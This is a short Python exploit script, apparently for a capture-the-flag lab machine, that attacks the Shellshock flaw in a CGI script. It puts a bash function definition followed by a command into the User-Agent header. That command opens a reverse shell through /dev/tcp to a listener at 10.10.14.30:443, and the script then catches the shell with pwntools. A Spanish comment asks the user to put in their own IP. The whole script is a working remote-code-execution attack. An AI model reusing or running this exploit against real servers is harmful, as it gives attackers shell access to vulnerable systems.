#!/usr/bin/python3

import requests, threading
from pwn import *

comando = "/bin/bash -i >& /dev/tcp/10.10.14.30/443 0>&1" 		# MODIFIQUE SU IP

url = 'http://10.10.10.56/cgi-bin/user.sh'

def shellshock():
	user_agent= { "User-Agent" : "() { :; }; echo; "+comando }
	print(user_agent)
	requests.get(url, headers=user_agent)

if __name__ == '__main__':
	threading.Thread(target=shellshock).start()
	shell = listen(443).wait_for_connection()
	shell.interactive()
